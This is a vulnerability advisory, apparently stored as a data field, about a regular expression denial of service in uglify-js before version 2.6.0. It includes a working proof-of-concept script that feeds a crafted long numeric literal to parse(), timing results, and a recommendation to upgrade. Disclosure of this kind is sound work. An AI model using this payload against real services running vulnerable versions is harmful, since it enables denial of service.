summary: "Regular Expression Denial of Service in uglify-js\nVersions of `uglify-js` prior to\
  \ 2.6.0 are affected by a regular expression denial of service vulnerability when malicious\
  \ inputs are passed into the `parse()` method.\n\n\n### Proof of Concept\n\n```\nvar u = require('uglify-js');\n\
  var genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n\
  \        result = result + chr;\n    }\n\n    return result;\n}\n\nu.parse(\"var a = \" +\
  \ genstr(process.argv[2], \"1\") + \".1ee7;\");\n```\n\n### Results\n```\n$ time node test.js\
  \ 10000\nreal\t0m1.091s\nuser\t0m1.047s\nsys\t0m0.039s\n\n$ time node test.js 80000\nreal\t\
  0m6.486s\nuser\t0m6.229s\nsys\t0m0.094s\n```\n\n\n## Recommendation\n\nUpdate to version 2.6.0\
  \ or later."
